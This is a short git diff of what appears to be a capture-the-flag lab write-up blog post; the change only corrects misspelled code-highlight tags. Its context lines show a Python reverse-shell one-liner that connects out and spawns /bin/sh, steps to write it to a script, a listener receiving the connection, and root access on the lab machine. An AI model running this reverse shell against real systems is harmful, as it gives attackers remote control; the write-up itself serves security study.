@@ -270,7 +270,7 @@ os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
 {% endhighlight %}
 
 Then, prepare needed command like following.
-{% highlihght shell %}
+{% highlight shell %}
 root@kali:~# cat python_rshell.txt 
 echo 'import socket,subprocess,os;' > script.py
 echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script.py
@@ -295,10 +295,10 @@ connect to [10.10.14.30] from (UNKNOWN) [10.10.10.85] 48518
 /bin/sh: 0: can't access tty; job control turned off
 # id
 uid=0(root) gid=0(root) groups=0(root)
-{% endhighlihgt %}
+{% endhighlight %}
 
 root.txt is in the directory "/root".
-{% highlihgt shell %}
+{% highlight shell %}
 # pwd         
 /root
 
